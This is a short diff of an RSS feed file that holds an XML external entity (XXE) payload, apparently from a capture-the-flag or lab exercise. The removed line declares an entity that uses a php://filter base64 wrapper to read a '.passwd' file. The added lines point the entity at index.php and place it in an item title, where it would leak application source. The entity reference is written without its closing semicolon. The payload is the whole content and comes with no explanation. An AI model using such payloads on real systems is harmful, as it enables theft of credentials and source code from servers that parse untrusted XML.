@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE rss [
     <!ELEMENT title ANY>
-    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd" >
+    <!ENTITY rss SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >
 ]>
 <rss version="2.0">
   <channel>
@@ -9,7 +9,7 @@
     <link>https://www.example.com/</link>
     <description>Example RSS feed</description>
     <item>
-      <title>News 1</title>
+      <title>&rss</title>
       <link>https://www.example.com/news1</link>
       <description>Description for News 1</description>
     </item>
